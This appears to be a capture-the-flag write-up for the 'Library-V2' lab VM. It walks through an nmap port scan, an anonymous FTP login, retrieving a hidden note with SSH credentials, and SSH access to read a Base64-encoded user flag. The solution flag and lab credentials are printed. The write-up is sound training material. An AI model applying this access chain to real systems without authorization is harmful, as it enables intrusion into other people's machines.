# 📚 Library-V2-User (Boot-to-Root)

---

## Flag
```
hack10{4n0nym0u5_ftp_t0_55h_w00t}
```

---

## Challenge Overview

This challenge provides a vulnerable virtual machine.

### Objective:
- Gain initial access to the system  
- Retrieve the **user flag**

---

## Environment Setup

Two machines were used:

- **Attacker**: Kali Linux  
- **Target**: Library-V2 VM  

### Network Configuration:
- Host-only network  

---

## Target Information

From the target interface:

```
IP Address: 192.168.56.108
```

---

## Step 1: Enumeration (Nmap)

Scan all ports:

```bash
nmap -Pn -T4 --min-rate 200 -p- 192.168.56.108 -oN nmap_allports.txt
```

---

## Observation

Multiple services are exposed. Initial focus was placed on:

```
FTP (Port 21)
```

---

## Step 2: FTP Access (Anonymous Login)

Connect to FTP:

```bash
ftp 192.168.56.108
```

### Credentials Used:

As part of the enumeration process, default credentials were tested against the FTP service.

```
Username: anonymous  
Password: anonymous
```
### Result:
- Successfully authenticated via FTP  
- Gained access to the file system  

---

## Step 3: File Enumeration

List files:

```bash
ls -la
```

### Key Finding:

```
.secret_note.txt
```

Download file:

```bash
get .secret_note.txt
```

---

## Step 4: Credential Discovery

Read the file:

```bash
cat .secret_note.txt
```

### Discovered Credentials:

```
Username: librarian  
Password: Shh!KeepQuiet
```

---

## Step 5: SSH Access

Since SSH is open, connect:

```bash
ssh librarian@192.168.56.108
```

---

## Step 6: User Enumeration

List files:

```bash
ls -lah
```

### Key File:

```
user.txt
```

---

## Step 7: Retrieve Flag

Read file:

```bash
cat user.txt
```

The content is Base64 encoded.

---

### Decode:

```bash
echo "encoded_string" | base64 -d
```

---

## Final Result

```
hack10{4n0nym0u5_ftp_t0_55h_w00t}
```

---

## Key Takeaways

- Anonymous FTP access can expose sensitive files  
- Poor credential management leads to easy compromise  
- Service chaining (FTP → SSH) is a common attack path  
- Enumeration is critical in identifying attack vectors  
- Base64 encoding is often used to hide flags  

---

## Tools Used

- Nmap  
- FTP client  
- SSH  
- Linux commands (`ls`, `cat`)  
- Base64 decoding / CyberChef  

---

## Skills Developed

- Network enumeration  
- FTP exploitation  
- Credential discovery  
- Service pivoting (FTP → SSH)  
- Post-exploitation enumeration  

---

⭐ *This challenge demonstrates how weak configurations and exposed services can lead to full system access.*
